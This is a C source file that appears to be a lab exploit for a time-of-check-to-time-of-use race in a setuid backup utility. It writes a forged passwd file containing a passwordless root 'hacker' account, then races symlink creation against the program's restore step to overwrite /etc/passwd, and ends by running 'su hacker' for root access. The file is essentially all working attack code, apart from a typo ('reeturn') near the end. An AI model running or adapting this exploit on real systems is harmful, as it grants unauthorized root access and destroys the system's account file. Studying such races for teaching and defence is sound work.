#include <stdio.h>
#include <unistd.h>

//For WEXITSTATUS
#include <stdlib.h>
#include <sys/wait.h>

#define TARGET "/usr/local/bin/backup" /* or backupV2*/ 
#define NUM_ITERATION 20
 void createPasswdFile()
 {
	FILE* fd = fopen("/share/passwd", "w");
	if(fd!=NULL)
	{
		fputs("root:$1$kdTmD8IE$/4r94P17auIwqZBjhd0fk0:0:0:root:/root:/bin/bash\n", fd);
		fputs("hacker::0:0:root:/root:/bin/bash\n", fd);
		fputs("user::1000:1000::/home/user:/bin/sh\n", fd);
		fputs("halt::0:1001::/:/sbin/halt\n", fd);
		
		fclose(fd);
	}
 }
 
int main(int argc, char **argv) 
{
	char *args[4];
	char *env[1];

	int i, j;
	int pid;
	int exitTOCTTOU;

	//Creates a password file with appended "hacker" entry in second line
	remove("passwd");	
	createPasswdFile();
	
	//Start backup
	args[0] = TARGET;
	args[1] = "backup";
	args[2] = "passwd"; 
	args[3] = NULL;
	env[0] = NULL;

	system("/usr/local/bin/backup backup passwd");
	
	//TTOCTU exploit starts here
	args[1] = "restore";
	args[2] = "passwd";
	
	for(i = 0; i < NUM_ITERATION; ++ i)
	{
		pid = fork();
		
		if( pid > 0 ) //Parent
		{
			//Parent restores file
			for(j = 0; j < NUM_ITERATION; ++ j)
			{
				system("/usr/local/bin/backup restore passwd");
				remove("passwd");
			}
			
			waitpid(pid, NULL, 0); //wait for child to create symlink
			
			//wc -l gets number of lines of passwd file. 
			//Original passwd file has 22 lines. If it is equal to 4 now, it means our "hacker" entry has been appended inside the file
			//backquote means everything inside is evaluated
			exitTOCTTOU = system("[ `wc -l /etc/passwd | cut -d ' ' -f1` -eq 4 ] && exit 1 || exit 0");
			
			if (WEXITSTATUS(exitTOCTTOU) == 1) break;
		}
		else if (pid == 0) //Child
		{
			for(j = 0; j < NUM_ITERATION; ++ j)
			{
				usleep(800);
				symlink("/etc/passwd", "passwd");
			}
			return 0;
		}
		else
		{
			puts("Error forking\n");
		}
	}
	//Should get root access here. Login to hacker
	system("su hacker");
	
	reeturn 0;
}